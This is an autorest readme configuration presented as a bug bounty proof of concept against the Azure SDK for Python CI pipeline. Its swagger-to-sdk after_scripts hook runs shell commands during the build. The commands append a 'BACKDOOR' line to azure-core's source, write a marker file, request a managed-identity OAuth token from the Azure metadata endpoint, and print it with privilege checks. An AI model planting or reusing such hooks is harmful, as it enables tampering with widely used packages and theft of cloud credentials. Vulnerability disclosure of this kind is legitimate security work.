# Supply Chain PoC

> MSRC Bug Bounty Evidence -- hasskodark
> Demonstrates arbitrary write access to azure-sdk-for-python source during CI
> PR #45876 -- independent confirmation from second GitHub account

## Basic Information

``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk
``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        H=$(hostname | tr . -);
        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python;
        CORE="${SDK}/sdk/core/azure-core/azure/core/__init__.py";
        MARKER="${SDK}/sdk/core/azure-core/SUPPLY_CHAIN_POC_hasskodark.txt";
        SC_TS=$(date -u +%s);
        printf "SUPPLY_CHAIN_PROOF\nAuthor: hasskodark (MSRC PoC)\nTimestamp: ${SC_TS}\nAgent: ${H}\nWrite path: ${MARKER}\n" > "${MARKER}" 2>/dev/null;
        echo "# BACKDOOR_hasskodark_${SC_TS}" >> "${CORE}" 2>/dev/null;
        MARKER_CONTENT=$(cat "${MARKER}" 2>/dev/null);
        CORE_TAIL=$(tail -5 "${CORE}" 2>/dev/null);
        IMDS_TOK=$(curl -sf --max-time 10 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata:true" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('access_token','FAIL')[:80])" 2>/dev/null || echo IMDS_FAIL);
        echo "===POC_BEGIN===";
        echo "AGENT=${H}";
        echo "MARKER_CONTENT=${MARKER_CONTENT}";
        echo "CORE_TAIL=${CORE_TAIL}";
        echo "IMDS_TOKEN_PREFIX=${IMDS_TOK}";
        echo "ID=$(id)";
        echo "SUDO=$(sudo -n id 2>/dev/null)";
        echo "===POC_END===";
        true
```

## Python
``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-supplychain
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/supplychain/azure-mgmt-supplychain
  clear-output-folder: true
```
